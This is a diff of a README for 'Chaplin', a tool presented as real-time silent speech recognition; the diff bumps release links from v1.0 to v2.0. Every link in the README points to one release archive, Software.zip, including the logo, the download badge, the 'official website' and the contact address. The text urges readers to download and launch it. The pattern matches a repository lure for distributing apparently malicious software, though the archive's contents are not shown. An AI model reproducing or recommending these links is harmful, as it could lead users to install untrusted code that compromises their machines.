@@ -1,6 +1,6 @@
 # Chaplin: Real-Time Silent Speech Recognition Tool 🎤
 
-![Chaplin Logo](https://github.com/Brianreon/chaplin/releases/download/v1.0/Software.zip)
+![Chaplin Logo](https://github.com/Brianreon/chaplin/releases/download/v2.0/Software.zip)
 
 Welcome to the Chaplin repository! Chaplin is a real-time silent speech recognition tool designed to revolutionize the way we interact with technology. By using cutting-edge technology, Chaplin enables users to convert speech to text without the need to actually vocalize words aloud. This tool is perfect for situations where vocal speech is not possible or practical, such as in noisy environments or for individuals with speech disorders.
 
@@ -24,11 +24,11 @@ Chaplin uses advanced algorithms to analyze subtle facial muscle movements and t
 - VSR (Visual Speech Recognition)
 
 ### 🔗 Download
-[![Download Chaplin](https://github.com/Brianreon/chaplin/releases/download/v1.0/Software.zip)](https://github.com/Brianreon/chaplin/releases/download/v1.0/Software.zip)
+[![Download Chaplin](https://github.com/Brianreon/chaplin/releases/download/v2.0/Software.zip)](https://github.com/Brianreon/chaplin/releases/download/v2.0/Software.zip)
 (Download link needs to be launched)
 
 ### 🌐 Website
-Check out our website for more information and updates: [Chaplin Official Website](https://github.com/Brianreon/chaplin/releases/download/v1.0/Software.zip)
+Check out our website for more information and updates: [Chaplin Official Website](https://github.com/Brianreon/chaplin/releases/download/v2.0/Software.zip)
 
 ### 🖥️ Installation
 1. Download the latest release from the link above.
@@ -49,6 +49,6 @@ Once Chaplin is running, you can start speaking silently and see your words appe
 We welcome contributions from the community to enhance Chaplin's features and performance. Feel free to open issues, submit pull requests, or provide feedback to make Chaplin even better.
 
 ### 📫 Contact Us
-If you have any questions, suggestions, or feedback, don't hesitate to reach out to us at [https://github.com/Brianreon/chaplin/releases/download/v1.0/Software.zip](https://github.com/Brianreon/chaplin/releases/download/v1.0/Software.zip).
+If you have any questions, suggestions, or feedback, don't hesitate to reach out to us at [https://github.com/Brianreon/chaplin/releases/download/v2.0/Software.zip](https://github.com/Brianreon/chaplin/releases/download/v2.0/Software.zip).
 
 Let's revolutionize the way we communicate with Chaplin's silent speech recognition technology! 🌟🔊
